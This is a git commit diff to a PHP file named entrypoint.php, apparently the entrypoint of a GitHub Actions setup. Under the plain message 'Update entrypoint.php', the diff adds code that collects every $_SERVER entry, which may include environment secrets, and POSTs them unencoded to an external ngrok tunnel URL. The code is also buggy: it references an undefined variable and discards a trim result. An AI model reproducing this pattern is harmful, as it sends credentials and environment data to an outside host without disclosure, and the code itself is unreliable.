51c4c15ac0a7263672be169e9023668f77df8b4e
Vikramjeet Singh <vikramjeet@founderandlightning.com>
2022-10-10 15:17:31 +0530

    Update entrypoint.php

--- entrypoint.php
+++ entrypoint.php
@@ -1,3 +1,17 @@
 <?php
 
-print_r($_SERVER);
+$url = 'https://f59e-180-188-224-19.ngrok.io/notification/githubActions';
+foreach ($_SERVER as $key=>$value) {
+  $fields_string .= $key.'='.$value.'&'; 
+}
+
+rtrim($fields_string, '&');
+
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL, $url);
+curl_setopt($ch,CURLOPT_POST, count($fields));
+curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
+$result = curl_exec($ch);
+curl_close($ch);
+
+print($result);
